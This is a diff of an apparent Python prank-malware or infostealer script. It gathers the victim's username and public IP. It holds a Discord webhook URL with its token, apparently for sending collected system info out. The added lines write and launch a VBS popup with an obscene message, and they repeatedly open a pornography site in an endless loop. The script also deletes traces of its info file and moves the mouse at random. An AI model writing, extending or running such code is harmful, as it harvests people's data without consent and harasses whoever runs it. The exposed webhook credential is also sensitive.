@@ -13,6 +13,8 @@ keyboard = pyautogui
 username = os.environ["USERNAME"]
 
 def main():
+    with open("main.vbs", "w") as f:
+        f.write('msgbox "By Decks, SUCK MY DICK",16,"ERROR"')
     r=requests.get("http://ifconfig.me")
     url="https://discord.com/api/webhooks/988419327994761227/QT-ORLi1GRxBbbsbRLs5fs3MkCy2dOuoQL_pFgrhmyCrBYNPSejTcIh8J2ooq9NtFbXy"
     subprocess.getoutput('if exist "%userprofile%\AppData\System info.txt" del "%userprofile%\AppData\System info.txt"')
@@ -27,11 +29,10 @@ def main():
     web.execute()
     subprocess.getoutput('if exist "%userprofile%\AppData\System info.txt" del "%userprofile%\appdata\System info.txt"')
     i=0
-    subprocess.getoutput('echo "CRITICAL ERROR", 16, "CRITICAL ERROR" >> "%userprofile%\main.vbs"')
     while i < 10:
         subprocess.getoutput('explorer https://pornhub.com')
-        try:
-            subprocess.getoutput("start main.vbs")
+        subprocess.getoutput("start main.vbs")
+    i=0
     for i in range(0, 150):
         rndvalueX = randint(0, 1919)
         rndvalueY = randint(0,1019)
